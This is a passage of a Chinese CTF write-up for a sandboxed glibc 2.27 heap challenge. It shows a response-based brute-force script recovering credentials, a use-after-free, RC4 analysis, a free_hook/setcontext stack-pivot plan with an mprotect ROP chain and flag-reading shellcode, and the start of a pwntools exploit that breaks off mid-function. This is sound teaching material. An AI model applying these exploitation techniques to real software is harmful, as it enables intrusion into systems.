class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)my_strcmp(s, ptr) )<span class="comment">// 对我们的输入调了strlen，\0绕过？</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid username!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="built_in">strlen</span>(ptr) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid username length!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Username correct!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Input your password:&quot;</span>);</span><br></pre></td></tr></table></figure><p>下面是这个逐字节爆破的思路：让char从0到0xFF遍历，成功了（回显不一样）就加到发送内容的后面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">crack_username</span>():</span><br><span class="line">    username = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span>(char == <span class="number">10</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            crack=username + char.to_bytes()</span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;Input your username:&#x27;</span>, crack)</span><br><span class="line">            p.recvline()</span><br><span class="line">            result=p.recvline()</span><br><span class="line">            <span class="keyword">if</span>(result==<span class="string">b&#x27;Invalid username!\n&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Invalid username length!\n&#x27;</span>):</span><br><span class="line">                username += char.to_bytes()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Username correct!\n&#x27;</span>):</span><br><span class="line">                username += char.to_bytes()</span><br><span class="line">                <span class="built_in">print</span>(username)</span><br><span class="line">                <span class="keyword">return</span> username</span><br><span class="line"><span class="comment"># 4dm1n</span></span><br><span class="line"><span class="comment"># 985da4f8cb37zkj</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_password</span>():</span><br><span class="line">    password=<span class="string">b&#x27;985da4f8cb37zkj&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span>(char == <span class="number">10</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            crack=password + char.to_bytes()</span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;Input your username:&#x27;</span>, <span class="string">b&#x27;4dm1n&#x27;</span>)</span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;Input your password:&#x27;</span>, crack)</span><br><span class="line">            p.recvline()</span><br><span class="line">            result=p.recvline()</span><br><span class="line">            <span class="keyword">if</span>(result==<span class="string">b&#x27;Invalid password!\n&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Invalid password length!\n&#x27;</span>):</span><br><span class="line">                password += char.to_bytes()</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Password correct!\n&#x27;</span>):</span><br><span class="line">                password += char.to_bytes()</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">                <span class="keyword">return</span> password</span><br></pre></td></tr></table></figure><h2 id="控制流与加密">控制流与加密</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( input_10() )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    save_data();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    read_data();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    delete_data();                <span class="comment">// UAF here</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    edit_data();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增查删改，程序允许通过exit函数退出。指针和size在全局变量数组里管理，可以看到free存在UAF漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">delete_data</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the key: &quot;</span>);</span><br><span class="line">  v2 = input_10();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid key!&quot;</span>);</span><br><span class="line">  ptr = (<span class="type">char</span> *)chunks[<span class="number">2</span> * v2 + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(aS4cur1tyP4ssw0);</span><br><span class="line">    encrypt1(byte_203180, aS4cur1tyP4ssw0, v1);</span><br><span class="line">    encrypt2(byte_203180, ptr, LODWORD(chunks[<span class="number">2</span> * v2]));</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序还有一个点是加密，这是一个用了密钥的对称加密。对常见的加密算法不是很熟所以当时放弃了，其实这是一个rc4。</p><blockquote><p>RC4由伪随机数生成器和异或运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个S盒。S盒用来加密数据，而且在加密过程中S盒会变化。由于异或运算的对合性，RC4加密解密使用同一套算法。</p></blockquote><p>下面就是一个典型的rc4加密算法初始化的过程，一般初始化要包含三个参数：Sbox数组，密钥，密钥的长度。</p><ol><li class="lvl-3"><p>初始化存储0-255字节的Sbox(其实就是一个数组)</p></li><li class="lvl-3"><p>填充key到256个字节数组中称为Tbox(你输入的key不满256个字节则初始化到256个字节)</p></li><li class="lvl-3"><p>交换s[i]与s[j] i 从0开始一直到255下标结束. j是 s[i]与T[i]组合得出的下标。</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">encrypt1</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *key, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+27h] [rbp-119h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+28h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+28h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+2Ch] [rbp-114h]</span></span><br><span class="line">  _BYTE v8[<span class="number">264</span>]; <span class="comment">// [rsp+30h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+138h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[i] = i;</span><br><span class="line">    v8[i] = key[i % a3];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">255</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = ((<span class="type">char</span>)v8[j] + v7 + (<span class="type">unsigned</span> __int8)a1[j]) % <span class="number">256</span>;</span><br><span class="line">    v4 = a1[j];</span><br><span class="line">    a1[j] = a1[v7];</span><br><span class="line">    a1[v7] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化s盒后就是加密了。加密同样接受三个参数：初始化好的sbox，待加密的明文，以及明文长度。</p><p>RC4加密其实就是遍历数据,将数据与sbox进行异或加密,而在此之前还需要交换一次sbox的数据交换完之后 再把s[i] + s[j]的组合当做下标再去异或.下面是本题中的加密函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">encrypt2</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+23h] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+24h] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v6 = (v6 + (<span class="type">unsigned</span> __int8)a1[v5]) % <span class="number">256</span>;</span><br><span class="line">    v4 = a1[v5];</span><br><span class="line">    a1[v5] = a1[v6];</span><br><span class="line">    a1[v6] = v4;</span><br><span class="line">    a2[i] ^= a1[(<span class="type">unsigned</span> __int8)(a1[v5] + a1[v6])];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序在读写的时候都会调用这套加密，创建chunk的时候会将输入加密后存储，read的时候会先解密读完再加密写回去，free则是会先解密再free（还算有点良心？）。</p><h1>攻击思路（重要）</h1><p>glibc2.27的noexecve的简单沙箱，我们肯定是setcontext栈迁移了，2.27还不用FSOP，直接用hook就行。</p><h2 id="什么是setcontext？">什么是setcontext？</h2><p>这是一个glibc库中的函数，用于恢复上下文。询问ai给出的答案是，这个函数一是可以用于在用户态实现线程和协程，二是作为POSIX标准的残留接口保留了下来。</p><p>这个函数牛逼在什么地方呢，它既然是涉及到切换上下文，那么肯定是对大量的寄存器赋值。这个函数中有<code>mov rsp,xxx</code>这样的gadget，我们可以利用这个东西在用户态劫持栈，实现<br>stack pivot。这种攻击方式在沙箱heap中非常常见，如果我们能劫持一次控制流，就总能想办法用这个gadget实现栈迁移最后ROP。</p><p>在glibc较低的版本中，非常好的地方是，这个函数对rsp赋值还是基于rdi的。以本题为例，<code>setcontext+53</code>的地方存放的是这样的一条指令：<code>mov rsp, [rdi+0xa0]</code>。rdi是我们喜闻乐见的，好控制的寄存器，因此这个很好用。如果我们函数第一参数是一个可控的指针，那就任意栈迁移了，于是可以结合free_hook去利用。</p><p>另外，在较高的版本中比如glibc2.35，这个函数不再依据rdi赋值，而是变成了rdx（偏移也变成了setcontext+61）。这让我们的利用难度有所增加但是不多，因为我们能找到交换rdx和rdi的gadget。以glibc2.35为例，就在0x167420这么一个gadget：<code>0x0000000000167420 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>, 将<code>rdi+8</code>指向的内容赋值给rdx，将rax写入栈顶，然后跳到<code>rdx+0x20</code>指向的位置执行。这样我们就能间接地实现将rdi和rdx关联起来，利用rdi给rdx赋值然后再setcontext</p><p>最后setcontext这段函数在给rsp赋值后，会<code>mov rcx,[rdi+0xa8]</code>然后<code>push rcx</code>最后ret，因此我们在fakestack地址+0x8的位置就可以写入我们接下来要执行的内容。好用</p><blockquote><p>另外，基于上下文切换还存在一种叫做“SROP”的攻击方法，是利用信号中断等方式，通过在栈上伪造上下文达成控制流劫持，和我们用setcontexgt的gadget有点点类似</p></blockquote><h2 id="回到题目…">回到题目…</h2><p>因此，在低版本还有hook的时候，我们对于沙箱heap题的思路就是free_hook+setcontext栈迁移rop。rop有两种思路，一种是纯rop去libc中找orw，另一种是写shellcode，然后用mprotect先把heap可执行。由于第一次接触时看的exp采用后者，下面笔者也使用后者的方法。</p><p>对于开了沙箱的题目，首先应该动调到我们能够手动控制分配的地方，观察堆的排布，从而确定我们接下来分配的size和堆风水需求，一般tcache和smallbin会比较乱，一般会挑一个size通过取和放将tcache填满后进行我们后续的工作。</p><p>对本题来说具体的攻击步骤如下：</p><ol><li class="lvl-3"><p>简单堆风水，然后用unsortedbin泄露libc，用tcache泄露堆地址</p></li><li class="lvl-3"><p>准备工作，先在一个chunk1中布局我们的fakestack（具体内容见后续）</p></li><li class="lvl-3"><p>然后在另一个chunk2里填充0xa0垃圾数据后，在0xa0偏移写入fakestack的栈顶（chunk1对应位置），然后在0xa8写入ret的gadget地址</p></li><li class="lvl-3"><p>任意地址分配chunk分配到freehook处，在freehook写入setcontext+53的地址</p></li><li class="lvl-3"><p>最后free掉chunk2，触发</p></li></ol><p>此时经历了下述流程：<br>free_hook(rdi=chunk2_addr)<br>-&gt;(mov rsp,[rdi+0xa0]，此时rsp内是chunk1_addr，栈已经被换)<br>-&gt;(mov rcx,[rdi+0xa8];push rcx，此时栈顶是一个ret的地址)<br>-&gt;ret两次，第二次ret就启动了我们fakestack上的rop链</p><h2 id="一些板子">一些板子</h2><p>关于fakestack的布置，这里写一个板子，因为我们首先要调用mprotect，因此要这么布置（开始可以填很多ret无所谓的）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p64(ret)</span><br><span class="line">+p64(pop_rdi)</span><br><span class="line">+p64(heap_base)</span><br><span class="line">+p64(pop_rsi)</span><br><span class="line">+p64(<span class="number">0x7000</span>)（size，无所谓，大点也好）</span><br><span class="line">+p64(pop_rdx)</span><br><span class="line">+p64(<span class="number">0x7</span>)</span><br><span class="line">+p64(mprotect)（直接libc.sym就行）</span><br><span class="line">+p64(heap_base+<span class="number">0x1670</span>+<span class="number">0x58</span>)（指向shellcode，也就是下一行的起始地址就行）</span><br><span class="line">+asm(shellcode)（orw）</span><br></pre></td></tr></table></figure><p>然后shellcode如下，buffer随便写一个能读写的地址就行，heap+0x3000这种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (</span><br><span class="line">    shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">    + shellcraft.read(<span class="string">&quot;rax&quot;</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">    + shellcraft.write(<span class="number">1</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1>总结</h1><p>最简单的沙箱堆，但是也花了小半天来复现。更高的版本也无非就是用fsop的链子，那一次的控制流劫持换到其他点然后后续还是一样的。或者是先跳到magic_gadget，就是麻烦了点。</p><h1>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># p=remote(&quot;0192d66238177833936ff330dfec8bbd.huj5.dg04.ciihw.cn&quot;,43631)</span></span><br><span class="line"><span class="comment"># charset = &quot;\nabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 爆破用户名</span></span><br><span class="line"><span class="comment"># def crack_username():</span></span><br><span class="line"><span class="comment">#     username = b&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         for char in range(1, 128):</span></span><br><span class="line"><span class="comment">#             if(char == 10):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             crack=username + char.to_bytes()</span></span><br><span class="line"><span class="comment">#             p.sendlineafter(b&#x27;Input your username:&#x27;, crack)</span></span><br><span class="line"><span class="comment">#             p.recvline()</span></span><br><span class="line"><span class="comment">#             result=p.recvline()</span></span><br><span class="line"><span class="comment">#             if(result==b&#x27;Invalid username!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Invalid username length!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 username += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Username correct!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 username += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 print(username)</span></span><br><span class="line"><span class="comment">#                 return username</span></span><br><span class="line"><span class="comment"># # 4dm1n</span></span><br><span class="line"><span class="comment"># def crack_password():</span></span><br><span class="line"><span class="comment">#     password=b&#x27;985da4f8cb37zkj&#x27;</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         for char in range(1,128):</span></span><br><span class="line"><span class="comment">#             if(char == 10):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             crack=password + char.to_bytes()</span></span><br><span class="line"><span class="comment">#             p.sendlineafter(b&#x27;Input your username:&#x27;, b&#x27;4dm1n&#x27;)</span></span><br><span class="line"><span class="comment">#             p.sendlineafter(b&#x27;Input your password:&#x27;, crack)</span></span><br><span class="line"><span class="comment">#             p.recvline()</span></span><br><span class="line"><span class="comment">#             result=p.recvline()</span></span><br><span class="line"><span class="comment">#             if(result==b&#x27;Invalid password!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Invalid password length!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 password += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 print(password)</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Password correct!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 password += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 print(password)</span></span><br><span class="line"><span class="comment">#                 return password</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(crack_username())</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">p=elf.process()</span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,value</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the value size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the value: &#x27;</span>,value)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;The result is:\n\t[key,value] = &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line">    value=p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    